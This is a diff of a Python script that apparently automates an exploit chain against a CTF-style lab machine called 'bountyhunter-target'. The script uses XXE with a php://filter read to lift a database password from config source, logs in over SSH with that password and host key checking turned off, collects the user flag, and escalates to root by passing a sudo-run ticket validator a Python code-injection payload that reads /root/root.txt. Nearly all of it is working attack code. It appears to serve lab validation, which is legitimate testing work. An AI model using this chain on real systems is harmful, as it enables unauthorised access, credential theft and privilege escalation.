@@ -26,7 +26,7 @@ def submit_xml(xml):
         return response.status, response.read().decode("utf-8", "replace")
 
 
-def ssh(password, command, timeout=20):
+def ssh(password, command, input_text=None, timeout=20):
     args = [
         "sshpass", "-p", password, "ssh",
         "-o", "StrictHostKeyChecking=no",
@@ -37,7 +37,8 @@ def ssh(password, command, timeout=20):
         "development@bountyhunter-target",
         command,
     ]
-    return subprocess.run(args, text=True, capture_output=True, timeout=timeout)
+    return subprocess.run(args, input=input_text, text=True, capture_output=True,
+                          timeout=timeout)
 
 
 status, home = get("/")
@@ -73,16 +74,12 @@ assert status == 200, xxe_response[:600]
 match = re.search(r"Reward:\s*([A-Za-z0-9+/=]+)", xxe_response)
 assert match, "XXE response did not contain the PHP filter output"
 config_source = base64.b64decode(match.group(1), validate=True).decode("utf-8", "replace")
-password_match = re.search(r'dbpassword\s*=\s*"([^"]+)"', config_source)
+password_match = re.search('dbpassword = "([^"]+)"', config_source)
 assert password_match, "The XXE-read db.php source did not contain the expected credential field"
 password = password_match.group(1)
 print("PASS: real PHP/libxml XXE + php://filter disclosed the beta config credential", flush=True)
 
-login = ssh(
-    password,
-    "id -un; id; cat /home/development/user.txt; "
-    "if test -r /root/root.txt; then echo ROOT_READABLE; else echo ROOT_DENIED; fi",
-)
+login = ssh(password, "id -un; id; cat /home/development/user.txt; if test -r /root/root.txt; then echo ROOT_READABLE; else echo ROOT_DENIED; fi")
 assert login.returncode == 0, (login.stdout, login.stderr)
 assert "development" in login.stdout and "uid=1000(development)" in login.stdout, login.stdout
 assert EXPECTED_USER_FLAG in login.stdout, "Exact per-instance User Flag not recovered over SSH"
@@ -93,19 +90,18 @@ sudo = ssh(password, "sudo -n -l")
 assert sudo.returncode == 0 and "/opt/skytrain_inc/ticketValidator.py" in sudo.stdout, (sudo.stdout, sudo.stderr)
 print("PASS: actual sudoers rule exposes only the Skytrain ticket validator", flush=True)
 
-ticket_lines = [
-    "# Skytrain Inc",
-    "## Ticket to QA",
-    "__Ticket Code:__",
+payload = (
+    "# Skytrain Inc\n"
+    "## Ticket to QA\n"
+    "__Ticket Code:__\n"
     '**32+__import__("os").system("id > /tmp/bountyhunter-root-proof; '
     'cat /root/root.txt > /tmp/bountyhunter-root-flag-proof; '
-    'chmod 0644 /tmp/bountyhunter-root-proof /tmp/bountyhunter-root-flag-proof")+1000**',
-]
-ticket = "\n".join(ticket_lines) + "\n"
-encoded_ticket = base64.b64encode(ticket.encode("utf-8")).decode("ascii")
+    'chmod 0644 /tmp/bountyhunter-root-proof /tmp/bountyhunter-root-flag-proof")+1000**\n'
+)
+encoded_ticket = base64.b64encode(payload.encode("utf-8")).decode("ascii")
 remote = (
     "printf '%s' '" + encoded_ticket + "' | base64 -d > /tmp/skytrain-ci.md && "
-    "printf '/tmp/skytrain-ci.md\\n' | "
+    "printf '/tmp/skytrain-ci.md\n' | "
     "sudo -n /usr/bin/python3 /opt/skytrain_inc/ticketValidator.py"
 )
 validation = ssh(password, remote, timeout=25)
